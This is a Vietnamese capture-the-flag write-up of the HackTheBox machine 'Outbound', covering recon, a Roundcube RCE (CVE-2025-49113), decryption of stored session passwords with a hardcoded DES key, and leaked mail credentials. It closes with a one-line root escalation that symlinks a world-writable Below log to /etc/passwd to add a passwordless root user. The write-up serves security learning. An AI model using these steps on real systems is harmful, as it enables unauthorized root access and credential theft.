![image](https://hackmd.io/_uploads/S1IMabZUgg.png)

# Machine info and Comment
## Machine info
Đây là một máy đang active nên chưa có thông tin về máy này [Link](https://app.hackthebox.com/machines/668)

## Comment
Bài này để ở easy thì hơi căng 

# Recon
## nmap
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.11.77        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 04:31 EDT
Nmap scan report for 10.10.11.77
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds
                                                     
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.11.77
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-13 04:31 EDT
Nmap scan report for 10.10.11.77
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

Add domain vào `/etc/hosts`
```
echo "10.129.226.36 mail.outbound.htb" | sudo tee -a /etc/hosts
```

# User flag
## Roundcube RCE (CVE-2025-49113)
Với credential `tyler:LhKL1o9Nm3X2` login vào web và ở mục `About` ta thấy web đang sử dụng **Roundcube Webmail 1.6.10**

![image](https://hackmd.io/_uploads/rJhiZg-8gx.png)

[Exploit Databse](https://www.exploit-db.com/exploits/52324) đã có PoC khai thác về phiên bản này

![image](https://hackmd.io/_uploads/rJ9YflbUxg.png)

Khai thác bằng msf

![image](https://hackmd.io/_uploads/Bk7WjeZLxg.png)

## Insecure Configuration in Database
Kiểm tra thư mục cấu hình của roundcube

![image](https://hackmd.io/_uploads/HyEL2gWUle.png)

Ta thấy được web sử dụng mysql bao gồm credential được hardcode trong file

![image](https://hackmd.io/_uploads/HJRm6xZ8ex.png)

![image](https://hackmd.io/_uploads/r1K_6lZIel.png)

![image](https://hackmd.io/_uploads/r1e0axZUee.png)

Vì lỗ hổng tồn tại trên Roundcube là insecure serialize nên truy xuất ở tables session sẽ cho ta nhiều thông tin

![image](https://hackmd.io/_uploads/HyQY0gZUgg.png)

Sử dụng Cyberchef dcode b64

![image](https://hackmd.io/_uploads/rJIqRgbIge.png)

Có thể thấy session có credential của `jacob`

![image](https://hackmd.io/_uploads/H14C0e-Ixg.png)

Mục tiêu tiếp theo là tìm cách dcode được pass này để nhảy sang user jacob

Quay lại file cấu hình `config.inc.php`, ở dòng cuối ta thấy dòng `$config['des_key'] = 'rcmail-!24ByteDESkey*Str';` đây là gợi ý cho việc dcypt mật khẩu

![image](https://hackmd.io/_uploads/BJxRUz-W8xl.png)

Sau khi hỏi chatgpt kết luận được loại mã hóa là 3DES. Viết [script](https://github.com/vanniichan/HackTheBox/blob/main/Outbound/decrypt_pass_3DES.py) dcrypt pass

![image](https://hackmd.io/_uploads/SJdxQbWUlg.png)

## Lateral Movement
Tưởng sau đó có user flag nhưng vẫn chưa : )

![image](https://hackmd.io/_uploads/HyaWVbbIgg.png)

Đọc mail có trong thư
```
jacob@mail:~/mail/INBOX$ cat jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wrxxxx

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Nội dung của mail về việc có lẽ là admin đã đổi mật khẩu của `jacob` thành `gY4Wr3xxx` (méo hiểu đổi mật khẩu mà mình vẫn `su` được :)) )và nội dung bên dưới nói về việc user này có quyền cao khi dùng tool giám sát có tên là Below (để leo quyền)

SSH bằng pass trên

Lỏ

![image](https://hackmd.io/_uploads/HkK3HW-8gl.png)

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh jacob@10.129.226.36

jacob@outbound:~$ ls
user.txt
jacob@outbound:~$ cat user.txt 
```

# Root flag
## below - symlink attack
Như mail đã mô tả, ta có thể leo quyền bằng `below`

![image](https://hackmd.io/_uploads/ry9QUbb8ll.png)

Tuy nhiên mail còn nói đến việc nó có liên quan đến log mà mình đã bỏ qua
```
For now we have enabled resource monitoring with Below and have g
ranted you privileges to inspect the the logs.
```

![image](https://hackmd.io/_uploads/SyTbPbZ8el.png)

Check 1 vòng các file thì không có gì

![image](https://hackmd.io/_uploads/r1VJOZZUge.png)

Đoạn này bó tay rồi nhưng mà sau khi có hint thì :))
```
Tệp /var/log/below/error_root.log có quyền -rw-rw-rw-, nghĩa là mọi người đều có thể ghi vào, bao gồm cả người dùng không có đặc quyền. Cấu hình sai này cho phép người dùng không phải root ghi đè hoặc thay thế tệp, khiến nó trở thành mục tiêu dễ bị khai thác (thông qua symlink).
```

![image](https://hackmd.io/_uploads/SkumKZbUeg.png)

```
jacob@outbound:/var/log/below$ echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass && rm -f /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log && cp /tmp/fakepass /var/log/below/error_root.log && su pwn
```

![image](https://hackmd.io/_uploads/H1jJTZbUlg.png)

![image](https://hackmd.io/_uploads/BJB7pbWLgg.png)
